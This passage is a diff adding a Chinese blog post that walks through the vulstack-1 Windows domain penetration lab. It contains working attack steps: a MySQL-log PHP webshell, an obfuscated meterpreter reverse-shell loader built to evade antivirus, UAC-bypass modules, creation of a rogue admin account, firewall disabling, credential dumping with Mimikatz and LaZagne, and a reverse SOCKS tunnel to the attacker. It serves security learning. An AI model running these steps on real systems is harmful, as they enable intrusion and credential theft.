@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="二品vulstack-1"/>
+
+
+
+
+  <meta name="keywords" content="域渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/18/二品vulstack-1/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="二品vulstack-1">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/18/%E4%BA%8C%E5%93%81vulstack-1/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/Cl72Ea3gzjHvryk.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/iYU91jfkx7BZ65W.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/WFilwx2mDSuJaEc.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/TNVrtRO1ehAFZod.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/kyKIrz46nlutiwD.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/kbVtRPnSYsgDwTJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/ekuRlQmJPWA6foU.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/A6LOWI49l3c5XrU.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/TqmC926IOZYlcDo.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/TF8XHSME7J5AOsP.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/fDIU6rBp8yERhzK.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/Be6T78rX1hJozdH.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/YfKUrjQLvJzFmXu.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/tP8YFrghdzIKinp.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/XDTIoxuJpZ5kjay.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/m3YonpGUCFtvDzB.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/nKOlgRTEUZ5c7BG.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/q4MgWkn6VsoU1zA.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/1henVNJUz8t27uG.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/hvlaswgDyUWGCpk.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/J6ygdKAuNR8ChPS.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/C4PoDbMLKjGtJBV.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/OWXahsiTGKwpJ3B.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/pRToqPDOyXnkax3.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/VIUme12QJ9iwu37.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/AjX4vGDTqiWcS3d.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/Fi61q3obDvgjhTz.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/NTBkUoMCVv46Yz8.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/TpJ4GYk1VogFtEu.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/LAHuh1Rft2ibXdn.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/BPwkFgp8lA1VSMC.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/ANQhVrcnSJLXevb.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/mMTCH92OwlcK13a.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/WAl1Og3ztnEpQU4.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/Vnha5IP7gGxtW4L.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/qap6TRv2u3egkIy.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/MvqNpYed1VQc4EZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/wZIaHGjd8pVDeQC.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/jTYhWOJ8snxPUCB.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/YjWQnHCLaZiyPJo.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/lqJtyzNgVSHnrKv.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/DWRplrbfLQHNC3A.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/XiVKcQwBG9aSu5l.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/YxgwVjMcstXImzW.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/26hOFXJSwnoZDju.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/qtbUKTnRW9AkNgS.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/19/PDzcH9N8qbVeQGn.png">
+<meta property="article:published_time" content="2020-03-18T10:25:46.000Z">
+<meta property="article:modified_time" content="2020-03-19T06:54:49.210Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/19/Cl72Ea3gzjHvryk.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> 二品vulstack-1 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          二品vulstack-1
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 18 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#一-环境搭建">一、环境搭建</a></li>
+<li><a href="#二-信息收集">二、信息收集</a></li>
+<li><a href="#三-getshell">三、getshell</a></li>
+<li><a href="#四-域渗透">四、域渗透</a></li>
+<li><a href="#msf提权方法">msf提权方法</a></li>
+<li><a href="#开启远程桌面连接">开启远程桌面连接</a></li>
+<li><a href="#cs与msf联动">cs与msf联动</a></li>
+<li><a href="#获取密码或hash">获取密码或hash</a></li>
+<li><a href="#信息收集">信息收集</a></li>
+<li><a href="#内网收集">内网收集</a></li>
+<li><a href="#内网攻击姿势-ms08-067">内网攻击姿势-MS08-067</a></li>
+<li><a href="#mimikatz插件">mimikatz插件</a></li>
+<li><a href="#内网攻击姿势-smb远程桌面口令猜测">内网攻击姿势-SMB远程桌面口令猜测</a></li>
+<li><a href="#内网攻击姿势-oracle数据库-tns服务漏洞">内网攻击姿势-Oracle数据库 TNS服务漏洞</a></li>
+<li><a href="#内网攻击姿势-rpc-dcom服务漏洞">内网攻击姿势-RPC DCOM服务漏洞</a></li>
+<li><a href="#内网攻击姿势-ms17-010">内网攻击姿势- MS17-010</a></li>
+<li><a href="#钓鱼攻击">钓鱼攻击</a></li>
+<li><a href="#内网其他主机端口-redis-getshell">内网其他主机端口-redis Getshell</a></li>
+<li><a href="#pth">PTH</a></li>
+<li><a href="#域渗透-横向移动wmi利用">域渗透-横向移动[wmi利用]</a></li>
+<li><a href="#内网其它主机端口-代理转发">内网其它主机端口-代理转发</a></li>
+<li><a href="#frp内网穿透">Frp内网穿透</a></li>
+<li><a href="#cs上线内网主机">CS上线内网主机</a></li>
+<li><a href="#ssh隧道">SSH隧道</a></li>
+<li><a href="#持久控制">持久控制</a></li>
+<li><a href="#http-listener交互信息隐藏">HTTP Listener交互信息隐藏</a></li>
+<li><a href="#ssp">SSP</a></li>
+<li><a href="#金票利用">金票利用</a></li>
+<li><a href="#后门植入">后门植入</a></li>
+<li><a href="#痕迹清理">痕迹清理</a></li>
+<li><a href="#总结">总结</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>昨天看到红日安全发了vulstack-1的wp，写的很详细，很多思路在我第一次做的时候都没有用到，于是打算跟着wp再学习一下。</p>
+<hr>
+<h4><span id="一-环境搭建">一、环境搭建</span></h4><p>win7-仅主机+NAT</p>
+<p>win2003-仅主机</p>
+<p>win2008-仅主机</p>
+<p><strong>网络拓扑图</strong></p>
+<p>边界机win7：192.168.52.143，169.254.129.186</p>
+<p>域成员win2003：192.168.52.141</p>
+<p>域控win2008：192.168.52.138 </p>
+<img src="https://i.loli.net/2020/03/19/Cl72Ea3gzjHvryk.png" alt="Snipaste_2020-03-17_18-30-42.png" style="zoom:50%;">
+
+<p><strong>测试连通性</strong></p>
+<p>win7可以ping通另两台，但是另外两台ping不通win7， 可能由于Win7开启了防火墙且过滤了ICMP数据包，所以在后续信息收集阶段的活跃主机探测时不能使用-sP. </p>
+<h4><span id="二-信息收集">二、信息收集</span></h4><p><strong>探测主机</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p>得到目标ip为<code>192.168.56.129</code></p>
+<p><strong>端口扫描</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.1.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/iYU91jfkx7BZ65W.png" alt="Snipaste_2020-03-17_20-36-49.png"></p>
+<p><strong>目录扫描</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.129 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-large-directories.txt -x .php,.txt,.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/WFilwx2mDSuJaEc.png" alt="Snipaste_2020-03-17_20-43-36.png"></p>
+<p>那个<code>beifen.rar</code>没扫出来，字典不够强大，略过</p>
+<h4><span id="三-getshell">三、getshell</span></h4><p>存在<code>phpmyadmin</code>以及<code>phpinfo.php</code></p>
+<p><code>root/root</code>弱口令登录，<code>phpinfo.php</code>查看网站绝对路径<code>C:/phpStudy/WWW</code></p>
+<p>查看sql语句能否文件写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;</span><br></pre></td></tr></table></figure>
+
+<p><code>secure_file_priv=NULL</code></p>
+<p>因此无法通过<code>into outfile</code>写入</p>
+<p>这里可以通过mysql日志写入的方式getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;</span><br><span class="line">SET global general_log_file&#x3D;&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;eval.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>插入一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接成功</p>
+<h4><span id="四-域渗透">四、域渗透</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>
+
+<p>发现在<code>god.org</code>域中</p>
+<p>首先给msf弹个shell，因为存在web服务，我们用msfvenom生成一个shellcode，而不是pe文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;3333 -f raw &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>这里显然没有杀软，如果有，之前的一句话木马应该是写不进去的</p>
+<p><strong>免杀payload</strong></p>
+<p>加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; file_get_contents(&#39;test.php&#39;);</span><br><span class="line">$encode &#x3D; base64_encode(gzdeflate($code));</span><br><span class="line">echo $encode;</span><br></pre></td></tr></table></figure>
+
+<p>黑名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$l &#x3D; &#39;baSe6&#39;;</span><br><span class="line">$o &#x3D; &#39;4_dE&#39;;</span><br><span class="line">$v &#x3D; &#39;cO&#39;;</span><br><span class="line">$e &#x3D; &#39;DE&#39;;</span><br><span class="line">$love &#x3D; $l.$o.$v.$e;</span><br><span class="line">$c &#x3D; &quot;love&quot;;</span><br><span class="line">$a &#x3D; $$c(&#39;cGhwaW5mbygpOwo&#x3D;&#39;);</span><br><span class="line">eval($a);</span><br><span class="line"></span><br><span class="line">$a &#x3D; strrev(&#39;EdOcEd_46eSaB&#39;);</span><br><span class="line">$b &#x3D; $a(&#39;cGhwaW5mbygpOwo&#x3D;&#39;);</span><br><span class="line">eval($b);</span><br></pre></td></tr></table></figure>
+
+<p>综合上面两个，最后的<code>test1.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; strrev(&#39;EdOcEd_46eSaB&#39;);</span><br><span class="line">$c &#x3D; strrev(&#39;eTALfNizG&#39;);</span><br><span class="line">$b &#x3D; $a(&#39;lVNtb9MwEP4rpopmRyoZHQiNlkmUaSBE2RDtt2myHOfSWs3sKHb3oir&#x2F;nbPd9IUxDfIp9j33vFwu0DSm4Q3UpnFKz9mbdEQSVZMzQgcfTrLB+9NskA1OTileewwW3uIzIqokjCWlB1rXgLjl1sglOC4rBdrRlBwdEWW5FFUl8goQm6ZkTRKLLUnJek7Ww+PjNYq1w3Xgbnte3HL3WMOOF5XboPYKW5FzI1p6OVODflEJFfrR&#x2F;H&#x2F;Qd2EQ4uBFifEX&#x2F;u3yYtYn06vz73w6+3Ux&#x2F;uEPEz47&#x2F;+lVG&#x2F;DITx2r0RqkY4ntkwN30QeCPXmhgKXe3b7nQLDvOZQ6ONWGRAgpV1pamu4hn4Ji2d4rJxcYfMclhYXtgIYkqUCjeonHIph+h405npajDhr5ttBN0L81dH4QeJhSYN9K10IuWe8Sq71+YPPji6SJuKb4Rm&#x2F;wJvfTwDncL1QFhKFVrLAkT8lH0lH&#x2F;Q7CcZPu5fOfrHdfzKUPfnyGf7W59vK+Tq8&#x2F;jyfSa3tq576Q3PpIdPa0Et5tyeI+LAQ8OtFVG88qIAgpG7WphrOr+AK34HNz2NoMHkCtnmqxQ1i8thztR0c3eRgzPH2th7Vlcc+53xqEAoxTT5OF3OQDGLwUVDmNNPB0LqHbzFX8D&#39;);</span><br><span class="line">$d &#x3D; $c($b);</span><br><span class="line">eval($d);</span><br></pre></td></tr></table></figure>
+
+<p>msf开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.130</span><br><span class="line">set lport 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/TNVrtRO1ehAFZod.png" alt="Snipaste_2020-03-17_23-10-44.png"></p>
+<p><strong>进程迁移</strong></p>
+<blockquote>
+<p>注意：仅Windows本机meterpreter（windows / meterpreter / reverse_tcp）支持迁移。 </p>
+<p>  from PHP meterpreter to native meterpreter with <code>sessions -u 3</code></p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/03/19/kyKIrz46nlutiwD.png" alt="Snipaste_2020-03-18_18-09-30.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate 2596</span><br></pre></td></tr></table></figure>
+
+<h4><span id="msf提权方法">msf提权方法</span></h4><p><strong>getsystem提权</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] Unknown command: getsystem.</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp提权</strong></p>
+<p><strong>绕过UAC进行提权</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbs</span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br></pre></td></tr></table></figure>
+
+<p><strong>提高程序运行级别</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br></pre></td></tr></table></figure>
+
+<p> <strong>windows提权漏洞</strong></p>
+<p> 如<code>ms13_053,ms14_058,ms16_016,ms16_032</code>等 </p>
+<p>================这里一开始出现了点问题</p>
+<p><img src="https://i.loli.net/2020/03/19/kbVtRPnSYsgDwTJ.png" alt="Snipaste_2020-03-18_15-17-11.png"></p>
+<p>花了半天没搞好。。主要是网上基本没有相关的，还有个解答是msf的版本，但是我下了好几个版本+pro也不行。。。只有github上有个issue，只是提到了<code>The target machine is Windows7 x64</code></p>
+<p>不过最后还是解决啦</p>
+<p><img src="https://i.loli.net/2020/03/19/ekuRlQmJPWA6foU.png" alt="Snipaste_2020-03-18_20-12-02.png"></p>
+<p>===========================分割线</p>
+<p><strong>使用cobaltstrike</strong></p>
+<p>teamserver启动服务，上线，Listener，generate生成可执行文件<code>artifact.exe</code>（因为当前环境没有杀软，故不考虑免杀），启动之后只要进程不被杀掉，随时可以上线。</p>
+<h4><span id="开启远程桌面连接">开启远程桌面连接</span></h4><p> 通过cmd创建用户， 使用远程桌面连接执行文件 </p>
+<p><strong>这里的cmd可以考虑蚁剑的虚拟终端,还有回显,meterpreter的shell没有回显</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user gqy test@1233 &#x2F;add   </span><br><span class="line">net localgroup administrators gqy &#x2F;add</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/A6LOWI49l3c5XrU.png" alt="Snipaste_2020-03-18_17-58-29.png"></p>
+<p>若目标主机开启了防火墙限制了3389的远程连接，可反弹一个msf的shell回来，尝试关闭防火墙 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑cmd关闭防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh adcfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>远程桌面<code>OWA\gqy    test@1233</code>成功连上</p>
+<p><strong>注意这里有时候前面跟的是域</strong></p>
+<p><strong>meterpreter上传并执行文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload &#x2F;tmp&#x2F;artifact.exe C:&#x2F;Windows</span><br><span class="line">execute -f artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/TqmC926IOZYlcDo.png" alt="Snipaste_2020-03-18_17-20-43.png"></p>
+<h4><span id="cs与msf联动">cs与msf联动</span></h4><p>先新建一个foreign Listener，然后把想派生的shell右键spawn选择新建的foreign<br>listener</p>
+<p>msf监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.130</span><br><span class="line">set lport 1233</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/TF8XHSME7J5AOsP.png" alt="Snipaste_2020-03-18_18-43-53.png"></p>
+<p>因为是<code>windows/meterpreter/reverse_tcp</code>，这个shell是可以直接进程迁移的</p>
+<p><img src="https://i.loli.net/2020/03/19/fDIU6rBp8yERhzK.png" alt="Snipaste_2020-03-18_18-45-09.png"></p>
+<h4><span id="获取密码或hash">获取密码或hash</span></h4><p><code>Dump Hashes</code>+<code>Run Mimikatz</code></p>
+<p><img src="https://i.loli.net/2020/03/19/Be6T78rX1hJozdH.png" alt="Snipaste_2020-03-18_19-34-21.png"></p>
+<p>使用LaZagne抓取所有支持软件的密码</p>
+<p>meterpreter或cs上传，</p>
+<p>cs执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bracon&gt;shell laZagne.exe all</span><br></pre></td></tr></table></figure>
+
+<p>msf进入shell执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laZagne.exe all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/YfKUrjQLvJzFmXu.png" alt="Snipaste_2020-03-18_21-01-37.png"></p>
+<h4><span id="信息收集">信息收集</span></h4><p>cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>
+
+<p>beacon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net config Workstation</span><br><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/tP8YFrghdzIKinp.png" alt="Snipaste_2020-03-18_20-30-29.png"></p>
+<p>得到<code>192.168.52.138</code>是域控</p>
+<h4><span id="内网收集">内网收集</span></h4><p>查看windwos漏打的补丁</p>
+<blockquote>
+<p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/XDTIoxuJpZ5kjay.png" alt="Snipaste_2020-03-18_21-19-58.png"></p>
+<p><img src="https://i.loli.net/2020/03/19/m3YonpGUCFtvDzB.png" alt="Snipaste_2020-03-18_21-20-16.png"></p>
+<p>查看路由信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/nKOlgRTEUZ5c7BG.png" alt="Snipaste_2020-03-18_21-22-01.png"></p>
+<p>添加路由并扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/q4MgWkn6VsoU1zA.png" alt="Snipaste_2020-03-18_21-40-30.png"></p>
+<p>前面看到靶机存在nmap，使用nmap的端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script&#x3D;vuln 192.168.52.141</span><br><span class="line">nmap --script&#x3D;vuln 192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<p><code>192.168.52.141</code></p>
+<p><img src="https://i.loli.net/2020/03/19/1henVNJUz8t27uG.png" alt="Snipaste_2020-03-18_21-57-43.png"></p>
+<p><code>192.168.52.138</code></p>
+<p><img src="https://i.loli.net/2020/03/19/hvlaswgDyUWGCpk.png" alt="Snipaste_2020-03-18_22-03-10.png"></p>
+<h4><span id="内网攻击姿势-ms08-067">内网攻击姿势-MS08-067</span></h4><blockquote>
+<p>MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。 </p>
+</blockquote>
+<p>打payload之前需要反向代理（autoroute只用于扫描），我用ew</p>
+<p>上传到靶机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.1.130 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>kali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ew_for_Linux32 -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
